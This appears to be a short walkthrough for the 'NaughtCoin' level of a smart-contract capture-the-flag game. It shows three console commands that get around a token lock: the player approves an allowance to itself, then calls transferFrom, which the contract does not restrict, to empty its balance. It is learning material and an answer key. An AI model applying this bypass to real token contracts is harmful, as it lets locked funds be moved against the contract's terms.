# NaughtCoin

**HINT:** Read up on openZeppelins contracts [here.](https://docs.openzeppelin.com/contracts/4.x/) If you already know how they work then you can see that only the transfer function is override and not the **transferFrom**.
<details>
<summary>Step 1</summary>
<p>
See how much we Have:

```js
(await contract.balanceOf(player)).toString()
``` 
* We use ```.toString()``` here because using ```Number()``` returns 1e+24 
<br></br>

Returns:
```js
"1000000000000000000000000"
```
</p>
</details>

<details>
<summary>Step 2</summary>
<p>
Before using transferFrom we need to increase our allowance like so:

```js
await contract.increaseAllowance(player, "1000000000000000000000000")
``` 
</p>
</details>

<details>
<summary>Step 3</summary>
<p>
Now we can use transferFrom:

```js
await contract.transferFrom (player, "Random_Address" , "1000000000000000000000000")
``` 
Double check that we no longer have any tokens
```js
(await contract.balanceOf(player)).toString()
``` 
Then click submit
</p>
</details>
